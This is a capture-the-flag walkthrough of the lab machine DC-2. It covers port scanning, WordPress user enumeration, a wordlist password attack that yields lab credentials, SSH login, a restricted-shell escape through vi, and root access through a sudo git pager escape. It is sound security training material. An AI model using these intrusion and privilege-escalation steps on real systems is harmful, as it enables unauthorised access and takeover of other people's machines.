---
layout: default
title: DC-2
parent: Proving Grounds Play
nav_order: 6
---

# Scanning

---

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY]
└─$ sudo nmap -Pn -p- -sC -sV -T4 --open 192.168.160.194
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-10 14:36 EST
Nmap scan report for 192.168.160.194
Host is up (0.068s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Did not follow redirect to http://dc-2/
7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)
| ssh-hostkey:
|   1024 52:51:7b:6e:70:a4:33:7a:d2:4b:e1:0b:5a:0f:9e:d7 (DSA)
|   2048 59:11:d8:af:38:51:8f:41:a7:44:b3:28:03:80:99:42 (RSA)
|   256 df:18:1d:74:26:ce:c1:4f:6f:2f:c1:26:54:31:51:91 (ECDSA)
|_  256 d9:38:5f:99:7c:0d:64:7e:1d:46:f6:e9:7c:c6:37:17 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.69 seconds

```

# Enumeration

---

## 80 | HTTP

Attempting to navigate to the IP in the browser results in attempted redirect to _dc-2_

Need to make an entry in the _/etc/hosts_ file for _dc-2_

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY]
└─$ sudo vim /etc/hosts

┌──(vagrant㉿kali)-[~/Documents/PG/PLAY]
└─$ cat /etc/hosts

192.168.160.194 dc-2

```

![index](../../../assets/images/ctfs/proving_grounds/dc-2/index.png)

Run _wpscan_ on the Wordpress site.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY]
└─$ wpscan --url http://dc-2 --disable-tls-checks --enumerate p --enumerate t --enumerate u

[+] WordPress version 4.7.10 identified (Insecure, released on 2018-04-03).
 | Found By: Rss Generator (Passive Detection)
 |  - http://dc-2/index.php/feed/, <generator>https://wordpress.org/?v=4.7.10</generator>
 |  - http://dc-2/index.php/comments/feed/, <generator>https://wordpress.org/?v=4.7.10</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://dc-2/wp-content/themes/twentyseventeen/
 | Last Updated: 2023-03-29T00:00:00.000Z
 | Readme: http://dc-2/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 3.2
 | Style URL: http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured image
s. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10, Match: 'Version: 1.2'


[i] User(s) Identified:

[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] jerry
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] tom
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

```

# Exploitation

---

Use Cewl to get a custom wordlist of the site

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/dc-2]
└─$ cewl http://dc-2 -m 5 -w cewl.txt 2>/dev/null


```

WPScan password attack with the enumerated users and _cewl_ password list.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/dc-2]
└─$ wpscan --url http://dc-2 --disable-tls-checks -U users.txt -P cewl.txt

[!] Valid Combinations Found:
 | Username: jerry, Password: adipiscing
 | Username: tom, Password: parturient

```

We have valid login credentials for _jerry_ and _tom_
jerry:adipiscing
tom:parurient
{: .warn }

We can SSH to port 7744 as _tom_

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/dc-2]
└─$ ssh tom@192.168.160.194 -p 7744
tom@192.168.160.194's password:

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
tom@DC-2:~$
```

# Post-Exploitation

---

## Break out to /bin/bash Shell

We initially do not have the ability to run any commands and receive _rbash_ errors.

![error](../../../assets/images/ctfs/proving_grounds/dc-2/error.png)

We can overcome this by using _vi_ to break out to a _/bin/bash_ shell

```bash
tom@DC-2:~$ vi

# Set the "shell" variable in vi text  editor
:set shell=/bin/bash
return

# Call the "shell" variable to exit vi with a /bin/bash shell
:shell
return

# Export PATH to global distro paths
tom@DC-2:~$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp

```

![set_shell](../../../assets/images/ctfs/proving_grounds/dc-2/set_shell.png)

![use_shell](../../../assets/images/ctfs/proving_grounds/dc-2/use_shell.png)

## Switch User to Jerry

```bash
# password = adipiscing; enumerated above
tom@DC-2:~$ su jerry
Password:

# export PATH
jerry@DC-2:/home/tom$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp

```

## Check Sudo -l for Jerry

```bash
jerry@DC-2:/home/tom$ sudo -l
Matching Defaults entries for jerry on DC-2:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jerry may run the following commands on DC-2:
    (root) NOPASSWD: /usr/bin/git

```

## Exploit SUDO Permissions on Git Binary (Privesc Through Pagination)

![sudo](../../../assets/images/ctfs/proving_grounds/dc-2/sudo.png)

```bash
jerry@DC-2:/home/tom$ sudo /usr/bin/git -p help config


# Break out of Git
!/bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)

```
